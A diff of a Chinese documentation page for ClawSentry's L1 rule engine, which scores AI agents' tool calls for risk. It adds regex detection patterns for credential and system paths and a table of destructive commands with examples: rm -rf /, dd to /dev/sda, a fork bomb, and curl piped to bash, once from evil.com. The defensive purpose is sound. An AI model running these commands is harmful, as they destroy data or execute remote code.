@@ -171,6 +171,11 @@
       </label>
       <nav class="md-search__options" aria-label="查找">
         
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
         <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
           
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
@@ -252,6 +257,8 @@
           
   
   
+    
+  
   入门指南
 
         </a>
@@ -272,6 +279,8 @@
           
   
   
+    
+  
   集成接入
 
         </a>
@@ -291,6 +300,8 @@
         <a href="../../configuration/configuration-overview/" class="md-tabs__link">
           
   
+  
+    
   
   配置参考
 
@@ -331,6 +342,8 @@
           
   
   
+    
+  
   API 文档
 
         </a>
@@ -352,6 +365,8 @@
         <a href="./" class="md-tabs__link">
           
   
+  
+    
   
   安全决策引擎
 
@@ -388,9 +403,11 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../advanced/rule-governance/" class="md-tabs__link">
+        <a href="../../advanced/skill-trust/" class="md-tabs__link">
           
   
+  
+    
   
   高级用法
 
@@ -411,6 +428,8 @@
         <a href="../../operations/deployment/" class="md-tabs__link">
           
   
+  
+    
   
   部署运维
 
@@ -518,6 +537,16 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -691,6 +720,22 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -948,6 +993,22 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -1232,6 +1293,26 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -1548,6 +1629,24 @@
   
     
     
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
     
     
       
@@ -1662,6 +1761,17 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        零外部依赖，毫秒级确定性过滤
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#overview" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1688,7 +1798,7 @@
   <a href="#d1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D1 — 工具类型危险度 (Tool Type Danger)
+        D1 — 工具类型危险度
       
     </span>
   </a>
@@ -1699,7 +1809,7 @@
   <a href="#d2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D2 — 目标路径敏感度 (Target Path Sensitivity)
+        D2 — 目标路径敏感度
       
     </span>
   </a>
@@ -1710,7 +1820,7 @@
   <a href="#d3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D3 — 命令模式危险度 (Command Pattern Danger)
+        D3 — 命令模式危险度
       
     </span>
   </a>
@@ -1721,7 +1831,7 @@
   <a href="#d4" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D4 — 会话风险累积 (Context Risk Accumulation)
+        D4 — 会话风险累积
       
     </span>
   </a>
@@ -1743,7 +1853,7 @@
   <a href="#d5" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D5 — Agent 信任等级 (Agent Trust Level)
+        D5 — Agent 信任等级
       
     </span>
   </a>
@@ -1754,7 +1864,7 @@
   <a href="#d6" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D6 — 注入检测 (Injection Detection)
+        D6 — 注入检测
       
     </span>
   </a>
@@ -1793,7 +1903,7 @@
   <a href="#short-circuit" class="md-nav__link">
     <span class="md-ellipsis">
       
-        短路规则 (Short-Circuit Rules)
+        短路规则
       
     </span>
   </a>
@@ -1840,7 +1950,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
         按事件类型分流
@@ -1870,12 +1980,12 @@
   <a href="#risk-snapshot" class="md-nav__link">
     <span class="md-ellipsis">
       
-        RiskSnapshot — 评估快照
+        风险评估快照（RiskSnapshot）
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="RiskSnapshot — 评估快照">
+    <nav class="md-nav" aria-label="风险评估快照（RiskSnapshot）">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1883,6 +1993,17 @@
     <span class="md-ellipsis">
       
         RiskDimensions 字段
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule_hits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        rule_hits 常见来源
       
     </span>
   </a>
@@ -1975,13 +2096,52 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="L1 → L2 升级条件">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#l2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        自动 L2 触发原因（按优先级）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        自动触发的抑制条件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tier" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tier 重写
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
   <a href="#fallback" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Fallback 决策
+        降级回退
       
     </span>
   </a>
@@ -2001,7 +2161,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
         会话策略
@@ -2023,7 +2183,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
       
         外部内容安全
@@ -2034,7 +2194,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
+  <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
       
         风险阈值与评分权重
@@ -2061,7 +2221,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+  <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       
         相关页面
@@ -2179,34 +2339,6 @@
     
   
     Post-action 围栏
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../sanitizer-capability/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Sanitizer 当前能力
   
 
     
@@ -2346,6 +2478,24 @@
   
     
     
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
     
     
       
@@ -2391,6 +2541,34 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../advanced/skill-trust/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Skill Trust / Registry
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2603,6 +2781,16 @@
   
     
     
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
     
     
       
@@ -2712,70 +2900,14 @@
   
   
     <li class="md-nav__item">
-      <a href="../../operations/docs-coverage-audit/" class="md-nav__link">
+      <a href="../../operations/release-progress/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
     
   
-    文档覆盖审计
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../operations/docs-audit-2026-04-27/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    执行审计 2026-04-27
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../operations/recent-feature-coverage/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    最近功能覆盖矩阵
+    发布进度
   
 
     
@@ -2878,6 +3010,17 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        零外部依赖，毫秒级确定性过滤
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#overview" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -2904,7 +3047,7 @@
   <a href="#d1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D1 — 工具类型危险度 (Tool Type Danger)
+        D1 — 工具类型危险度
       
     </span>
   </a>
@@ -2915,7 +3058,7 @@
   <a href="#d2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D2 — 目标路径敏感度 (Target Path Sensitivity)
+        D2 — 目标路径敏感度
       
     </span>
   </a>
@@ -2926,7 +3069,7 @@
   <a href="#d3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D3 — 命令模式危险度 (Command Pattern Danger)
+        D3 — 命令模式危险度
       
     </span>
   </a>
@@ -2937,7 +3080,7 @@
   <a href="#d4" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D4 — 会话风险累积 (Context Risk Accumulation)
+        D4 — 会话风险累积
       
     </span>
   </a>
@@ -2959,7 +3102,7 @@
   <a href="#d5" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D5 — Agent 信任等级 (Agent Trust Level)
+        D5 — Agent 信任等级
       
     </span>
   </a>
@@ -2970,7 +3113,7 @@
   <a href="#d6" class="md-nav__link">
     <span class="md-ellipsis">
       
-        D6 — 注入检测 (Injection Detection)
+        D6 — 注入检测
       
     </span>
   </a>
@@ -3009,7 +3152,7 @@
   <a href="#short-circuit" class="md-nav__link">
     <span class="md-ellipsis">
       
-        短路规则 (Short-Circuit Rules)
+        短路规则
       
     </span>
   </a>
@@ -3056,7 +3199,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
         按事件类型分流
@@ -3086,12 +3229,12 @@
   <a href="#risk-snapshot" class="md-nav__link">
     <span class="md-ellipsis">
       
-        RiskSnapshot — 评估快照
+        风险评估快照（RiskSnapshot）
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="RiskSnapshot — 评估快照">
+    <nav class="md-nav" aria-label="风险评估快照（RiskSnapshot）">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -3099,6 +3242,17 @@
     <span class="md-ellipsis">
       
         RiskDimensions 字段
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rule_hits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        rule_hits 常见来源
       
     </span>
   </a>
@@ -3191,13 +3345,52 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="L1 → L2 升级条件">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#l2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        自动 L2 触发原因（按优先级）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        自动触发的抑制条件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tier" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tier 重写
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
   <a href="#fallback" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Fallback 决策
+        降级回退
       
     </span>
   </a>
@@ -3217,7 +3410,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
         会话策略
@@ -3239,7 +3432,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
       
         外部内容安全
@@ -3250,7 +3443,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
+  <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
       
         风险阈值与评分权重
@@ -3277,7 +3470,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+  <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       
         相关页面
@@ -3298,6 +3491,54 @@
           
             <div class="md-content" data-md-component="content">
               
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="导航栏" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    首页
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    安全决策引擎
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
               <article class="md-content__inner md-typeset">
                 
                   
@@ -3308,6 +3549,16 @@
 
 
 <h1 id="l1">L1 规则引擎<a class="headerlink" href="#l1" title="Permanent link">&para;</a></h1>
+<div class="cs-doc-hero">
+<div class="cs-eyebrow">决策引擎 · L1 规则引擎</div>
+<h2 id="_1">零外部依赖，毫秒级确定性过滤<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>L1 是 ClawSentry 三层决策模型的第一层，也是唯一始终在线的决策层。完全基于确定性规则，不调用任何 LLM，通过 D1-D6 六维评分 + 八条短路规则（SC-1..SC-8）在每次工具调用前给出 allow / block / defer 判决，并决定是否升级到 L2/L3 深度审查。</p>
+<div class="cs-pill-row">
+<p><span class="cs-pill">D1-D6 六维评分</span>
+<span class="cs-pill">SC-1..SC-8 短路规则</span>
+<span class="cs-pill">&lt; 1ms 决策延迟</span></p>
+</div>
+</div>
 <h2 id="overview">概述<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
 <p>L1 是 ClawSentry 三层递进决策模型的<strong>第一层</strong>，也是<strong>唯一始终在线</strong>的决策层。每一个进入 Gateway 的 <code>CanonicalEvent</code> 都会经过 L1 评估，无一例外。</p>
 <p>L1 完全基于确定性规则，不调用任何 LLM 接口，<strong>零外部依赖</strong>。典型决策延迟 <strong>&lt; 1ms</strong>，确保 Agent 运行时的同步阻塞窗口尽可能短。</p>
@@ -3354,6 +3605,10 @@
 </tr>
 </tbody>
 </table>
+<div class="admonition note">
+<p class="admonition-title">Skill Trust runtime binding rules</p>
+<p>v0.8.0 起，L1 也消费 Skill Trust runtime evidence：<code>runtime_path_disallowed</code>、<code>runtime_source_ambiguous</code>、<code>runtime_path_unverified</code>、<code>runtime_content_unverified</code>、<code>runtime_content_mismatch</code> 和 <code>first_use_skill_package_review</code> verdict 都会按 profile action 进入 risk snapshot。FSPR 和 L2/L3 只能追加 evidence；canonical allow/defer/block 仍由 Gateway policy engine 产生。v0.8.2 起 post-action provenance validator 已移除。</p>
+</div>
 <pre class="mermaid"><code>graph TD
     E[CanonicalEvent] --&gt; D1[D1 工具危险度]
     E --&gt; D2[D2 路径敏感度]
@@ -3375,7 +3630,7 @@
 <hr />
 <h2 id="d1-d6">D1-D6 六维评分体系<a class="headerlink" href="#d1-d6" title="Permanent link">&para;</a></h2>
 <p>ClawSentry 将每个事件分解为六个风险维度进行评分。D1-D5 产生整数分值并互相独立；D6 采用连续浮点值，作为乘数放大基础评分，专门捕捉提示词注入和命令注入企图。</p>
-<h3 id="d1">D1 — 工具类型危险度 (Tool Type Danger)<a class="headerlink" href="#d1" title="Permanent link">&para;</a></h3>
+<h3 id="d1">D1 — 工具类型危险度<a class="headerlink" href="#d1" title="Permanent link">&para;</a></h3>
 <p><strong>取值范围：0-3</strong></p>
 <p>D1 根据事件中 <code>tool_name</code> 字段判断工具的固有危险程度。不同类型的工具被预分类到四个危险等级。</p>
 <table>
@@ -3434,7 +3689,7 @@
 <p>当事件缺少 <code>tool_name</code> 字段时，D1 取保守默认值 <strong>2</strong>，并在 <code>missing_dimensions</code> 中记录 <code>"d1"</code>。</p>
 </div>
 <hr />
-<h3 id="d2">D2 — 目标路径敏感度 (Target Path Sensitivity)<a class="headerlink" href="#d2" title="Permanent link">&para;</a></h3>
+<h3 id="d2">D2 — 目标路径敏感度<a class="headerlink" href="#d2" title="Permanent link">&para;</a></h3>
 <p><strong>取值范围：0-3</strong></p>
 <p>D2 分析事件涉及的文件路径，判断目标资源的敏感程度。路径从 <code>payload</code> 中的 <code>path</code>、<code>file_path</code>、<code>file</code>、<code>target</code>、<code>destination</code>、<code>source</code> 字段提取，也会从 <code>command</code> 字段中启发式解析。</p>
 <table>
@@ -3450,130 +3705,178 @@
 <tr>
 <td style="text-align: center;"><strong>0</strong></td>
 <td>安全</td>
-<td>用户工作空间内的常规文件</td>
+<td>用户工作空间内的常规文件（无敏感模式）</td>
 <td><code>./src/main.py</code>, <code>README.md</code></td>
 </tr>
 <tr>
 <td style="text-align: center;"><strong>1</strong></td>
 <td>配置</td>
-<td><code>.config.</code>、<code>.env</code>、<code>.rc</code>、<code>Makefile</code>、<code>Dockerfile</code></td>
+<td><code>\.config\.</code>、<code>\.env</code>、<code>\.rc$</code>、<code>Makefile$</code>、<code>Dockerfile$</code>、<code>docker-compose</code></td>
 <td><code>.env.local</code>, <code>Dockerfile</code></td>
 </tr>
 <tr>
 <td style="text-align: center;"><strong>2</strong></td>
 <td>凭证</td>
-<td><code>.ssh/</code>、<code>.gnupg/</code>、<code>credentials</code>、<code>.pem</code>、<code>.key</code>、<code>.p12</code></td>
+<td><code>is_credential_path()</code>：<code>.env</code>、<code>.pem</code>、<code>.key</code>、<code>.p12</code>、<code>.pfx</code>、<code>.jks</code>、<code>.keystore</code>、<code>id_rsa</code>、<code>id_ed25519</code>、<code>credentials</code>、<code>.secret</code>、<code>.token</code>、<code>.password</code>、<code>.aws/</code>、<code>.ssh/</code>，或路径含 <code>.gnupg/</code></td>
 <td><code>~/.ssh/id_rsa</code>, <code>cert.pem</code></td>
 </tr>
 <tr>
 <td style="text-align: center;"><strong>3</strong></td>
 <td>系统关键</td>
-<td><code>/etc/</code>、<code>/usr/</code>、<code>/var/</code>、<code>/sys/</code>、<code>/proc/</code>、<code>/boot/</code></td>
+<td><code>^(/etc/\|/usr/\|/var/\|/sys/\|/proc/\|/boot/)</code></td>
 <td><code>/etc/shadow</code>, <code>/proc/1/maps</code></td>
 </tr>
 </tbody>
 </table>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># 路径敏感度正则（简化）</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">_D2_SYSTEM_CRITICAL</span>   <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;^(/etc/|/usr/|/var/|/sys/|/proc/|/boot/)&quot;</span><span class="p">)</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">_D2_CREDENTIAL</span>        <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(\.ssh/|\.gnupg/|credentials|\.pem$|\.key$)&quot;</span><span class="p">)</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">_D2_CONFIG</span>            <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(\.config\.|\.env|\.rc$|Makefile$|Dockerfile$)&quot;</span><span class="p">)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># risk_snapshot.py</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">_D2_SYSTEM_CRITICAL</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;^(/etc/|/usr/|/var/|/sys/|/proc/|/boot/)&quot;</span><span class="p">)</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">_D2_CONFIG_PATTERNS</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(\.config\.|\.env|\.rc$|Makefile$|Dockerfile$|docker-compose)&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># 凭证路径委托给 risk_signals.is_credential_path() — 见下方</span>
+</span></code></pre></div>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># risk_signals.py：凭证路径正则（共享于多个分析器）</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">_CREDENTIAL_PATH_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="sa">r</span><span class="s2">&quot;\.(env|pem|key|p12|pfx|jks|keystore)(?:$|[^a-z0-9])|&quot;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="sa">r</span><span class="s2">&quot;id_rsa|id_ed25519|credentials|\.secret|\.token|\.password|&quot;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    <span class="sa">r</span><span class="s2">&quot;\.aws/|\.ssh/&quot;</span><span class="p">,</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">,</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="p">)</span>
 </span></code></pre></div>
 <div class="admonition tip">
 <p class="admonition-title">多路径取最大值</p>
 <p>当一个事件涉及多个路径时（例如 <code>cp /etc/shadow /tmp/leak</code>），D2 取所有路径分值的<strong>最大值</strong>。</p>
 </div>
+<div class="admonition note">
+<p class="admonition-title">缺失路径的保守回退</p>
+<p>当 <code>_extract_paths(event)</code> 返回空（既无 <code>path/file_path/...</code> 字段，也无可解析的命令行路径）时，D2 取保守默认值 <strong>1</strong>，并在 <code>missing_dimensions</code> 中记录 <code>"d2"</code>。</p>
+</div>
 <hr />
-<h3 id="d3">D3 — 命令模式危险度 (Command Pattern Danger)<a class="headerlink" href="#d3" title="Permanent link">&para;</a></h3>
+<h3 id="d3">D3 — 命令模式危险度<a class="headerlink" href="#d3" title="Permanent link">&para;</a></h3>
 <p><strong>取值范围：0-3</strong></p>
 <p>D3 只对 bash/shell/exec 类工具生效，分析 <code>payload.command</code> 字段中的具体命令内容。对于非 shell 工具，D3 固定为 <strong>0</strong>。</p>
 <div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">分值 0 — 安全命令</label><label for="__tabbed_1_2">分值 1 — 常规写入</label><label for="__tabbed_1_3">分值 2 — 潜在破坏</label><label for="__tabbed_1_4">分值 3 — 高危命令模式</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
 <p>已知无副作用的只读命令：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ls, cat, echo, pwd, whoami, date, env, printenv,
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>hostname, uname, id, wc, sort, uniq, diff,
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>head, tail, less, more, file, which, type
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ls, cat, echo, pwd, whoami, date, env, printenv,
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>hostname, uname, id, wc, sort, uniq, diff,
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>head, tail, less, more, file, which, type
 </span></code></pre></div>
 </div>
 <div class="tabbed-block">
 <p>有限范围的写入操作：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>cp, mv, mkdir, touch, git add, git commit, ln, rename
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>cp, mv, mkdir, touch, git add, git commit, ln, rename
 </span></code></pre></div>
 </div>
 <div class="tabbed-block">
 <p>可能产生不可逆影响的操作：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>rm, git push, git reset, npm install, pip install,
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>yarn add, apt install, yum install
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>rm, git push, git reset, npm install, pip install,
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>yarn add, apt install, yum install
 </span></code></pre></div>
 </div>
 <div class="tabbed-block">
-<p>通过正则匹配的已知高危模式，<strong>命中即触发短路规则</strong>：</p>
+<p>通过正则匹配的已知高危模式，<strong>命中即触发短路规则 SC-2</strong>。完整列表见 <code>risk_snapshot._D3_HIGH_DANGER_PATTERNS</code>：</p>
 <table>
 <thead>
 <tr>
+<th>类别</th>
 <th>模式</th>
-<th>说明</th>
 <th>示例</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>rm -rf</code></td>
-<td>递归强制删除</td>
+<td>递归删除</td>
+<td><code>rm\s+.*-[^\s]*r[^\s]*f</code>、<code>rm\s+-rf</code></td>
 <td><code>rm -rf /</code>, <code>rm -rf ~/*</code></td>
 </tr>
 <tr>
-<td><code>dd</code></td>
 <td>磁盘直写</td>
+<td><code>\bdd\b.*\bof\s*=\s*/dev/</code></td>
 <td><code>dd if=/dev/zero of=/dev/sda</code></td>
 </tr>
 <tr>
-<td><code>mkfs</code></td>
-<td>格式化文件系统</td>
+<td>格式化</td>
+<td><code>\bmkfs\b</code></td>
 <td><code>mkfs.ext4 /dev/sda1</code></td>
 </tr>
 <tr>
-<td><code>:(){ :\|:&amp; };:</code></td>
 <td>Fork 炸弹</td>
-<td>耗尽系统资源</td>
+<td><code>:\(\)\s*\{</code></td>
+<td><code>:(){ :\|:&amp; };:</code></td>
 </tr>
 <tr>
-<td><code>curl \| sh</code></td>
-<td>下载并执行</td>
-<td><code>curl https://evil.com/x \| bash</code></td>
+<td>远程下载执行</td>
+<td><code>curl\s.*\|\s*(sh\|bash)</code>、<code>wget\s.*\|\s*(sh\|bash)</code></td>
+<td><code>curl https://x \| bash</code></td>
 </tr>
 <tr>
-<td><code>wget \| bash</code></td>
